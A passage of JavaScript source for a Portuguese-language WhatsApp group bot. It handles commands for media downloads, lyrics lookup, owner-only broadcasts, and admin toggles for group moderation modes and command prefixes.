var ImageSerieLink = `https://image.tmdb.org/t/p/original${serieInfo.data.results[0].backdrop_path}`;
var fotoSerie = await getBuffer(ImageSerieLink)
safeSendMessage(from, {image: fotoSerie, caption: mess.series(serieInfo)}, {quoted: non})
.catch(e => {
return enviar(mess.error())
})
break

case 'instagram': {
if(!q) return enviar(`🔹 Uso correto: ${prefix}instagram link`)
reagir(from, '✅')
let rus = await igdl(q);
safeSendMessage(from, {video: {url: rus.result[0].url}, mimetype: "video/mp4"}, {quoted: non})
}
break

case 'mediafire':
try {
if(!q.includes("mediafire.com")) return enviar("Faltando o link do mediafire para download do arquivo, cade?");
let nex = await fetchJson(`https://api.nexfuture.com.br/api/downloads/mediafire/dl?url=${q}`)
enviar(`Enviando: ${nex.resultado.nome}\n\nPeso: ${nex.resultado.size}`)

await safeSendMessage(from, {document: 
{url: nex.resultado.url}, mimetype: "application/"+nex.resultado.mime, fileName: nex.resultado.nome});
} catch (error) {
console.log(error)
return enviar("Deu um pequeno error, tente novamente mais tarde...")
}
break;

case "letra": case "lirycs": case "letram": case "letramusic": case "letramusica":
if(!q.trim()) return enviar(`🔹 Uso correto: ${prefix + command} Ela me traiu`)
await randomreact();
await sleep(1000)
const abcmv = await fetchJson(`https://zero-two-apis.com.br/api/letramusic?query=${q}&apikey=${KEY_ZERO}`);
enviar(`- *Titulo:* ${abcmv.resultado[0]?.full_txt}\n\n- *Compositor:* ${abcmv.resultado[0]?.art}\n\n- *Letra:* ${abcmv.resultado[0]?.lyrics}`)
break;

case 'bc': case 'bcgroup': case 'transmitir': case 'transmissão': {
if(!SoDono && !info.key.fromMe) return enviar(arise.donosmt)
if(!q) return enviar( `Texto onde? Exemplo: ${prefix + command} Hasta la vista baby`)
let getGroups = await client.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
for (i = 0; i < anu.length; i++) {
await sleep(1500)
let txt = `「 *NOLAN BOT TRANSMISSÃO* 」\n\n${q}`
safeSendMessage(anu[i], {text: txt})
}
enviar(`Enviado com sucesso...`)
}
break

case 'antiimg':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!isAntiImg) {
dataGp[0].antiimg = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗜𝗠𝗚 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(isAntiImg) {
dataGp[0].antiimg = false
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗜𝗠𝗚 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'antivideo':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!isAntiVid) {
dataGp[0].antivideo = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗩𝗜𝗗𝗘𝗢 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(isAntiVid) {
dataGp[0].antivideo = false
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗩𝗜𝗗𝗘𝗢 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'antiaudio':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!isAntiAudio) {
dataGp[0].antiaudio = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗔𝗨𝗗𝗜𝗢 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(isAntiAudio) {
dataGp[0].antiaudio = false
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗔𝗨𝗗𝗜𝗢 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'antisticker':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!isAntiSticker) {
dataGp[0].antisticker = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗦𝗧𝗜𝗖𝗞𝗘𝗥 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(isAntiSticker) {
dataGp[0].antisticker = false
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗦𝗧𝗜𝗖𝗞𝗘𝗥 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'antidocumento':
case 'antidoc':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!Antidoc) {
dataGp[0].antidoc = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗗𝗢𝗖 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(Antidoc) {
dataGp[0].antidoc = false
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗗𝗢𝗖 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'antictt':
case 'anticontato':  
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!isAntiCtt) {
dataGp[0].antictt = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗖𝗢𝗡𝗧𝗔𝗧𝗢 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(isAntiCtt) {
dataGp[0].antictt = false
setGp(dataGp)
enviar('️⛔ 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗖𝗢𝗡𝗧𝗔𝗧𝗢 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'antiloc':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!Antiloc) {
dataGp[0].antiloc = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗟𝗢𝗖𝗞 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(Antiloc) {
dataGp[0].antiloc = false
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗟𝗢𝗖𝗞 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'antilinkgp':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!isAntilinkgp) {
dataGp[0].antilinkgp = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗟𝗜𝗡𝗞𝗚𝗣 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(isAntilinkgp) {
dataGp[0].antilinkgp = false
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗟𝗜𝗡𝗞𝗚𝗣 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'antilinkhard':
case 'antilink':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!isAntiLinkHard) {
dataGp[0].antilinkhard = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗟𝗜𝗡𝗞𝗛𝗔𝗥𝗗 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(isAntiLinkHard) {
dataGp[0].antilinkhard = false
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗟𝗜𝗡𝗞𝗛𝗔𝗥𝗗 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️️')
}
break

case 'x9':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!isx9) {
dataGp[0].x9 = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗫𝟵 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(isx9) {
dataGp[0].x9 = false
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗫𝟵 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'visualizarmsg':
if(!SoDono) return enviar(arise.donosmt)
if(!isVisualizar) {
nescessario.visualizarmsg = true
setNes(nescessario)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗩𝗜𝗦𝗨𝗔𝗟𝗜𝗭𝗔𝗥 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(isVisualizar) {
nescessario.visualizarmsg = false
setNes(nescessario)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗩𝗜𝗦𝗨𝗔𝗟𝗜𝗭𝗔𝗥 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'x9visuunica':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!isX9VisuUnica) {
dataGp[0].visuUnica = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗫𝟵𝗩𝗜𝗦𝗨 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(isX9VisuUnica) {
dataGp[0].visuUnica = false
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗫𝟵𝗩𝗜𝗦𝗨 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'so_adm':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!So_Adm) {
dataGp[0].soadm = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗦𝗢-𝗔𝗗𝗠 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(So_Adm) {
dataGp[0].soadm = false
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗦𝗢-𝗔𝗗𝗠 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'odelete':
if(!isGroup) return enviar(arise.grupo)
if(!SoDono) return enviar(arise.donosmt)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!IS_DELETE) {
nescessario.Odelete = true
setNes(nescessario)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗢𝗗𝗘𝗟𝗘𝗧𝗘 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(IS_DELETE) {
nescessario.Odelete = false
setNes(nescessario)
enviar('️⛔ 𝗠𝗢𝗗𝗢 𝗢𝗗𝗘𝗟𝗘𝗧𝗘 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'antifake':
if(!isGroup) return enviar(arise.grupo)
if(!SoDono) return enviar(arise.donosmt)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!isAntifake) {
dataGp[0].antifake = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗙𝗔𝗞𝗘 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(isAntifake) {
dataGp[0].antifake = false
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗙𝗔𝗞𝗘 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'add_prefixo':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isMultiP) return enviar(`Para usar este comando, você deve ativar o comando, multiprefix\n🔹 Uso correto:  ${prefix}multiprefixo`)
if(ANT_LTR_MD_EMJ(q)) return enviar("Não pode letra modificada, nem emoji..")
if(!q.trim()) return enviar("Determine o novo prefixo, não pode espaço vazio...")
if(q.trim() > 1) return enviar(`Calma, o prefixo só pode ser um\n🔹 Uso correto: ${prefix + command} _\nAi eu vou passar á responder _ como prefixo..`)
if(dataGp[0].prefixos.indexOf(q.trim()) >= 0) return enviar(`Esse prefixo já se encontra incluso.`)
dataGp[0].prefixos.push(q.trim())
setGp(dataGp)
enviar(`Prefixo ${q.trim()} foi adicionado com sucesso na lista de prefixos para uso do bot, neste grupo...`)
break

case 'tirar_prefixo':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isMultiP) return enviar(`Para usar este comando, você deve ativar o comando, multiprefix\nExemplo: ${prefix}multiprefixo`)  
if(ANT_LTR_MD_EMJ(q)) return enviar("Não pode letra modificada, nem emoji..")
if(!q.trim()) return enviar("Determine o prefixo que deseja tirar, não pode espaço vazio...")
if(q.trim() > 1) return enviar(`O prefixo só pode ser tirado um por vez.`)
if(dataGp[0].prefixos.indexOf(q.trim()) < 0) return enviar(`Esse prefixo não está incluso, procure ver na lista dos prefixos. Veja: ${prefix}prefixos`)
if(dataGp[0].prefixos.length == 1) return enviar("Adicione um prefixo para pode tirar este, tem que ter pelo menos 1 prefixo já incluso dentro do sistema para tirar outro.")
dataGp[0].prefixos.splice(dataGp[0].prefixos.indexOf(q.trim()), 1)
setGp(dataGp)
enviar(`Prefixo ${q.trim()} tirado com sucesso da lista de prefixos de uso deste grupo..`)
break

case 'multiprefixo': case 'multiprefix':  
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins && !SoDono) return enviar(arise.adm)
if(!isMultiP) {
dataGp[0].multiprefix = true
setGp(dataGp)
enviar('Ativou com sucesso o recurso de multi prefixos neste grupo.')
}
if(isMultiP) {
dataGp[0].multiprefix = false
setGp(dataGp)
enviar('Desativou com sucesso o recurso de multi prefixos neste grupo.')
}
break

case 'ephemeral': case 'msgtemp':
if (!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if (!isBotGroupAdmins) return enviar(arise.Badmin)
getInfoG = await client.groupMetadata(from); /* Pegar as informações total do grupo! */
if (getInfoG.ephemeralDuration == undefined) {
enviar(`As mensagens temporárias no grupo foram ativadas com sucesso.`)
await safeSendMessage(from, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL})
} else if (getInfoG.ephemeralDuration > 1) {
enviar(`As mensagens temporárias no grupo foram desativadas com sucesso.`)
await safeSendMessage(from, { disappearingMessagesInChat: false})
}
break

case 'changegroup': case 'config_gp': case 'config-group': {
if (!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if (!isBotGroupAdmins) return enviar(arise.Badmin)
if (!q) return enviar(`Insira all / adms para escolher quem pode atualizar os dados do grupo. A decisão é sua, adm! `)
if (args[0] === 'adms') {
enviar(`🔐 Sucesso! - Agora somente os adm poderá editar os dados do grupo.`)
await client.groupSettingUpdate(from, 'locked')
} else if (args[0] === 'all') {
enviar(`🔓 Sucesso! - Agora todos os participantes pode alterar os dados do grupo.`)
await client.groupSettingUpdate(from, 'unlocked')
}
}
break

case 'rmphotogp': case 'rmfotogroup': {
if (!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if (!isBotGroupAdmins) return enviar(arise.Badmin)
enviar(`A foto do grupo foi removida com sucesso.`)
await client.removeProfilePicture(from)
}
break

case 'antinotas':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!isAntiNotas) {
dataGp[0].antinotas = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗡𝗢𝗧𝗔𝗦 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(isAntiNotas) {
dataGp[0].antinotas = false
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗡𝗢𝗧𝗔𝗦 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'anticatalogo':
case 'anticatalg':  
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(msgg.botadm)
if(!isAnticatalogo) {
dataGp[0].anticatalogo = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗖𝗔𝗧𝗔𝗟𝗢𝗚𝗢 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(isAnticatalogo) {
dataGp[0].anticatalogo = false
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗖𝗔𝗧𝗔𝗟𝗢𝗚𝗢 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️️')
}
break

case 'modoaluguel':
if(!isGroup) return enviar(arise.grupo)
if(!SoDono) return enviar(arise.donomt)
if (!isModoAluguel) {
dataGp[0].aluguel = true;
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗔𝗟𝗨𝗚𝗨𝗘𝗟 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if (isModoAluguel) {
dataGp[0].aluguel = false;
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗔𝗟𝗨𝗚𝗨𝗘𝗟 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔')
}
break

case 'modopremium':
if (!SoDono) return enviar(arise.donomt)
if (!nescessario.cmd_premium) {
nescessario.cmd_premium = true;
setNes(nescessario)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if (nescessario.cmd_premium) {
nescessario.cmd_premium = false;
setNes(nescessario)
enviar('️⛔ 𝗠𝗢𝗗𝗢 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔')
}
break

case 'prefixon':
case 'prefixoff':
if(!SoDono) return enviar(arise.donosmt)
if(!isPrefixo) {
nescessario.prefixativo = true
setNes(nescessario)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗣𝗥𝗘𝗙𝗜𝗫𝗢 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗚𝗟𝗢𝗕𝗔𝗟𝗠𝗘𝗡𝗧𝗘 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(isPrefixo) {
nescessario.prefixativo = false
setNes(nescessario)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗣𝗥𝗘𝗙𝗜𝗫𝗢 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗚𝗟𝗢𝗕𝗔𝗟𝗠𝗘𝗡𝗧𝗘 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔')
}
break

case 'Autodown':
case 'autodown':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if (!isAutodown) {
dataGp[0].autodown = true;
setGp(dataGp);
 return enviar('🟢 𝗠𝗢𝗗𝗢 𝗔𝗨𝗧𝗢𝗗𝗢𝗪𝗡 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢');
} else if (isAutodown) {
dataGp[0].autodown = false;
setGp(dataGp);
return enviar('⛔ 𝗠𝗢𝗗𝗢 𝗔𝗨𝗧𝗢𝗗𝗢𝗪𝗡 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔');
}
break

case 'autohorario':
if (!isGroup) return enviar(arise.grupo)
if (!isGroupAdmins) return enviar(arise.adm)
const pathHorarix = `./banco de dados/grupos/games/${from}.json`
// cria se não existir
if (!fs.existsSync("./banco de dados/grupos")) {
fs.mkdirSync("./banco de dados/grupos/games", { recursive: true })
}
if (!fs.existsSync(pathHorarix)) {
fs.writeFileSync(pathHorarix, JSON.stringify({ groupId: from, ativo: false }, null, 2))
}
let dato = JSON.parse(fs.readFileSync(pathHorarix))
if (!dato.ativo) {
dato.ativo = true
fs.writeFileSync(pathHorarix, JSON.stringify(dato, null, 2))
return enviar('🟢 𝗠𝗢𝗗𝗢 𝗛𝗢𝗥𝗔𝗥𝗜𝗢 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else {
dato.ativo = false
fs.writeFileSync(pathHorarix, JSON.stringify(dato, null, 2))
return enviar('⛔ 𝗠𝗢𝗗𝗢 𝗛𝗢𝗥𝗔𝗥𝗜𝗢 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔')
}
break

case 'stock-grow':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if (!Stockgrow) {
dataGp[0].grow = true;
setGp(dataGp);
return enviar('🟢 𝗠𝗢𝗗𝗢 𝗦𝗧𝗢𝗖𝗞𝗚𝗥𝗢𝗪 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢');
} else if (Stockgrow) {
dataGp[0].grow = false;
setGp(dataGp);
return enviar('⛔ 𝗠𝗢𝗗𝗢 𝗦𝗧𝗢𝗖𝗞𝗚𝗥𝗢𝗪 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔');
}
break

